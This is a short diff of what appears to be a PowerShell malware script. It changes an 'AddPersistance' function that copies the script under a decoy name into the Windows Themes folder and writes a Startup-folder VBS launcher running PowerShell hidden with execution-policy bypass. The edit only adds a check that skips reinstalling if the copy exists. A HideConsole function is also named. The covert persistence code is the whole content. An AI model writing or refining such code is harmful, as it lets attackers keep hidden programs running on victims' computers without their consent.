@@ -76,6 +76,8 @@ Function HideConsole{
 
 Function AddPersistance{
     $newScriptPath = "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
+    if (!(test-path $newScriptPath)){
+
     $scriptContent | Out-File -FilePath $newScriptPath -force
     sleep 1
     if ($newScriptPath.Length -lt 100){
@@ -90,6 +92,7 @@ objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%
     $pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
     $tobat | Out-File -FilePath $pth -Force
     rm -path "$env:TEMP\temp.ps1" -Force
+    }
 }
 
 Function RemovePersistance{
